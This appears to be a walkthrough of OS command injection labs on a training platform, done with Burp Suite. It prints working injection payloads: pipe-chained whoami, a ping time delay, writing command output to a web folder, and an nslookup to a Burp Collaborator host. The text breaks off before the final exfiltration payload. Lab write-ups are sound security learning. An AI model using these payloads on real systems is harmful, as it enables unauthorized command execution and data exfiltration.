So the vulnerability lies in the storeId function.

Checking payload all things I saw something on chaining commands, we can execute the ```whoami``` command by chaining it. So, we'll have something like this
```
storeId=1|whoami
```
Trying this

So we got the name of the current user.

Lets capture this request and send it over to burp intruder

We were told the vulnerability is in the feedback function. We'll be injecting the email section. we can use this payload to cause a 10 second delay
```
||ping -c 10 127.0.0.1||
```
Applying that payload and ensuring it is url encoded

Capturing this request on burpsuite and sending it over to burp repeater

Now, we were given the writable folder to be ```/var/www/images``` and we are to execute the ```whoami``` command and then retrieve the output. So to write to that folder we can use the payload
```
||whoami > /var/www/images/abeg.txt||
```
Ensure this is url encoded

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/52142d1b-dea3-4b0f-9398-4919c6d0dad5)

Lets try to view an image, we'll be capturing this request on burpsuite and sending it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5e20f52c-9ab0-4e84-8811-2d9ad311d08a)

Now the file we wrote the ```whoami``` command to earlier was ```abeg.txt```, so we'll be changing the name of the image to ```abeg.txt```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e4559180-7927-4715-bf87-c6424faf6935)

Cool, the command got executed successfully.

so, to solve this lab we have to issue a DNS lookup to burp collaborator

Click on "copy to clipboard" to copy the payload to use. So we can use ```nslookup``` with the payload burp collaborator client generated for us
```
||nslookup 2ad7n17mkusj9u18hveevnj8zz5pte.oastify.com||
```
Ensure it is url encoded

Capture this request on burpsuite and send it over to burp repeater

We have execute the ```whoami``` command and exfiltrate the output via a DNS query to Burp Collaborator.

Click on "copy to clipboard" to copy the payload to use. So we can use ```nslookup``` with the payload burp collaborator client generated for us to run the ```whoami``` command.

We can use the payload
```
